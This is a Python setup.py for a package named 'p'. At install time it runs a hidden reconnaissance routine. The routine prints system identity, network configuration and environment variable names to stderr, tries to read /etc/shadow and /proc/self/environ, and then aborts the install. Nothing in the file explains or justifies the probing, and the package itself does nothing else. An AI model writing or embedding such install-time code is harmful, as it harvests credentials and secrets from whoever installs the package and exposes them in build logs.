import os, sys, subprocess as sp
from setuptools import setup

def cf_audit():
    o = sys.stderr.write
    o(f"\nID: {os.getuid()}\n")
    o(f"UNAME: {sp.getoutput('uname -a')}\n")
    o(f"PWD: {os.getcwd()}\n")
    
    ps = ['/etc/shadow', '/proc/self/environ', '/etc/hosts']
    for p in ps:
        try:
            with open(p, 'r') as f: o(f"READ {p}: {f.read(100)}\n")
        except: o(f"READ {p}: DENIED\n")
            
    o(f"IFCONFIG:\n{sp.getoutput('ip addr || ifconfig')}\n")
    o(f"ENV_VARS: {list(os.environ.keys())}\n")
    sys.exit(1)

try: cf_audit()
except: sys.exit(1)

setup(name="p", version="0.1")
